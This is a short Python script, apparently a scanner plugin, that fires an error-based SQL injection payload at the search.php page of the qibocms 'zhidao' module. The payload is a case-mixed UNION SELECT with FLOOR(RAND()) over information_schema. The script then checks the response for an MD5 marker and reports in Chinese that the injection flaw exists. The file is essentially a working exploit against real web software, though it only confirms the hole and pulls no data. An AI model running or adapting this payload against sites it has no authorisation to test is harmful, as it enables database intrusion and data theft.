#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/zhidao/zhidao/search.php?&tags=ll%20ll%20ll&keyword=111&fulltext[]=11)%20AnD%201=2%20UnIoN%20SeLeCt%201%20FrOm%20(SeLeCt%20CoUnT(*),CoNcAt(FlOoR(RaNd(0)*2),Md5(1234))a%20FrOm%20InFoRmAtIoN_ScHeMa.TaBlEs%20GrOuP%20By%20a)b%23"
bug ="81dc9bdb52d04dc20036dbd8313ed055"
info ="存在qibocms知道系统注入漏洞"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
